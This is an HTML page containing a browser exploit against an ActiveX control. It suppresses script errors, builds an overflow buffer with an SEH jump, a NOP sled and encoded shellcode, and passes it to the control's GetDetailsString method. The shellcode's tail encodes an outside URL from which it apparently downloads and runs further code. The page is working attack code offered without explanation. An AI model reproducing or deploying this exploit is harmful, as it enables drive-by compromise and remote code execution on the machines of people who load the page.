
<html>

<script>window.onerror=function(){return true;}</script>
<OBJECT id="target" classid="clsid:A8D3AD02-7508-4004-B2E9-AD33F087F43C">
</OBJECT>

<script>

function poc() {

var shellcode = unescape(
"%u03eb" +
"%ueb59" +
"%ue805" +
"%ufff8" +
"%uffff" +
"%u4949" +
"%u4949" +
"%u4949" +
"%u4948" +
"%u4949" +
"%u4949" +
"%u4949" +
"%u4949" +
"%u4949" +
"%u5a51" +
"%u436a%u3058" +
"%u3142%u4250" +
"%u6b41" +
"%u4142%u4253%u4232%u3241%u4141%u4130%u5841%u3850%u4242%u4875" +
"%u6b69%u4d4c%u6338%u7574%u3350%u6730%u4c70%u734b%u5775%u6e4c" +
"%u636b%u454c%u6355%u3348%u5831%u6c6f%u704b%u774f%u6e68%u736b" +
"%u716f%u6530%u6a51%u724b%u4e69%u366b%u4e54%u456b%u4a51%u464e" +
"%u6b51%u4f70%u4c69%u6e6c%u5964%u7350%u5344%u5837%u7a41%u546a" +
"%u334d%u7831%u4842%u7a6b%u7754%u524b%u6674%u3444%u6244%u5955" +
"%u6e75%u416b%u364f%u4544%u6a51%u534b%u4c56%u464b%u726c%u4c6b" +
"%u534b%u376f%u636c%u6a31%u4e4b%u756b%u6c4c%u544b%u4841%u4d6b" +
"%u5159%u514c%u3434%u4a44%u3063%u6f31%u6230%u4e44%u716b%u5450" +
"%u4b70%u6b35%u5070%u4678%u6c6c%u634b%u4470%u4c4c%u444b%u3530" +
"%u6e4c%u6c4d%u614b%u5578%u6a58%u644b%u4e49%u6b6b%u6c30%u5770" +
"%u5770%u4770%u4c70%u704b%u4768%u714c%u444f%u6b71%u3346%u6650" +
"%u4f36%u4c79%u6e38%u4f63%u7130%u306b%u4150%u5878%u6c70%u534a" +
"%u5134%u334f%u4e58%u3978%u6d6e%u465a%u616e%u4b47%u694f%u6377" +
"%u4553%u336a%u726c%u3057%u5069%u626e%u7044%u736f%u4147%u4163" +
"%u504c%u4273%u3159%u5063%u6574%u7035%u546d%u6573%u3362%u306c" +
"%u4163%u7071%u536c%u6653%u314e%u7475%u7038%u7765%u4370%u7468%u7074%u2f3a%u642f%u776f%u2e6e%u3931%u3934%u3130%u3130%u632e%u2f6e%u6464%u662f%u2e64%u736a%u0000");

var buff= "";
var nsp = unescape("%u06EB%u9090");
var sh = unescape("%u6950%u74C9");
var nop = unescape("%u9090%u9090%u9090%u9090%u9090%u9090");

for (i=0;i<1638;i++)  buff=buff + unescape("%u4141");

buff = buff + nsp + sh + nop + shellcode;

target.GetDetailsString(buff,1);
}

</script>
</html>

